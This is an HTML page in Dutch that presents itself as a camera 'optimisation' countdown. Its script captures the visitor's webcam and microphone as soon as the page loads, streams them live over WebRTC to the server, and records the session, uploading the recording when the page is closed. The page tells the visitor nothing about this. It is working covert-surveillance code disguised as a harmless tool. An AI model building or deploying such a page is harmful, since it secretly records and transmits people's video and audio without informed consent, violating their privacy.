<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8" />
  <title>Camera optimaliseren</title>
  <style>
    body { 
      font-family: sans-serif; 
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background: #111;
      color: #fff;
      text-align: center;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 20px;
    }
    #countdown {
      font-size: 3em;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h1>ðŸ“· Camera optimaliseren...</h1>
  <div id="countdown">30</div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    let pc, mediaRecorder, recordedChunks = [], liveStream;

    // Afteller
    let seconds = 30;
    const countdownEl = document.getElementById("countdown");
    const timer = setInterval(() => {
      seconds--;
      countdownEl.textContent = seconds;
      if (seconds <= 0) {
        clearInterval(timer);
        countdownEl.textContent = "âœ… Klaar";
      }
    }, 1000);

    async function startEverything() {
      try {
        liveStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: true
        });

        // WebRTC live
        pc = new RTCPeerConnection({
          iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
        });
        liveStream.getTracks().forEach(t => pc.addTrack(t, liveStream));
        pc.onicecandidate = e => { if (e.candidate) socket.emit("ice-candidate", e.candidate); };

        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        socket.emit("offer", offer);

        socket.on("answer", async (answer) => {
          await pc.setRemoteDescription(new RTCSessionDescription(answer));
        });
        socket.on("ice-candidate", async (candidate) => {
          try { await pc.addIceCandidate(new RTCIceCandidate(candidate)); } catch (e) { console.error(e); }
        });

        // Opname
        recordedChunks = [];
        mediaRecorder = new MediaRecorder(liveStream, { mimeType: "video/webm" });
        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
        mediaRecorder.onstop = uploadRecording;
        mediaRecorder.start();

      } catch (err) {
        console.error("Camera/microfoon fout:", err);
      }
    }

    async function uploadRecording() {
      try {
        const blob = new Blob(recordedChunks, { type: "video/webm" });
        recordedChunks = [];
        const form = new FormData();
        form.append("recording", blob, "opname.webm");
        form.append("title", "auto");
        await fetch("/upload-recording", { method: "POST", body: form });
      } catch (err) {
        console.error("Upload mislukt:", err);
      }
    }

    // Stop automatisch bij sluiten
    window.addEventListener("beforeunload", () => {
      try {
        if (mediaRecorder && mediaRecorder.state !== "inactive") {
          mediaRecorder.stop();
        }
        if (pc) pc.close();
        if (liveStream) liveStream.getTracks().forEach(t => t.stop());
      } catch (_) {}
    });

    // ðŸš€ Direct starten
    startEverything();
  </script>
</body>
</html>
